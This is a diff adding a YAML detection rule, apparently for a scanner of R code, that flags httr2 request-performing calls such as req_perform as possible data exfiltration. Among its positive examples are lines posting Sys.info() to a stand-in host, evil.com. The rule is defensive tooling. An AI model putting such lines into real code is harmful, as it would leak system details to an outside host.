@@ -1,0 +1,52 @@
+name: httr2_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+    An httr2 HTTP call sends an outbound request. A request may be used to
+    exfiltrate credentials or other data.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'req_perform' or
+      text() = 'req_perform_iterative' or
+      text() = 'req_perform_parallel' or
+      text() = 'req_perform_sequential' or
+      text() = 'req_perform_stream' or
+      text() = 'req_perform_connection' or
+      text() = 'req_perform_promise'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    req_perform(req)
+  - |
+    httr2::req_perform(req)
+  - |
+    request("https://evil.com/evil") |>
+      req_body_json(list(host = Sys.info())) |>
+      req_perform()
+  - |
+    httr2::request("https://evil.com/evil") |>
+      httr2::req_perform()
+  - |
+    req_perform_parallel(reqs)
+  - |
+    httr2::req_perform_iterative(req, next_req)
+  - |
+    req_perform_stream(req, callback)
+  - |
+    req_perform_sequential(reqs)
+negative_examples:
+  - |
+    foo$req_perform()
+  - |
+    foo@req_perform()
+  - |
+    perform(x)
+  - |
+    req_body_json(req, data)
